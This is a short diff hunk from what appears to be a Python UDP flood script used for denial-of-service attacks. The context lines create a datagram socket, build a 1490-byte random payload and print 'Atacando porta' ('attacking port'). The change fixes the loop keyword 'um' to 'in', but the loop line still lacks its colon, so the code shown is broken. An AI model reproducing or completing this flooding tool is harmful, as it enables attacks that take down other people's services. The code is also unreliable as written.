@@ -66,7 +66,7 @@ time.sleep(5)
 os.system("clear")
 time.sleep(1)
 
-for x um range(50)
+for x in range(50)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 print('Atacando porta 💥')
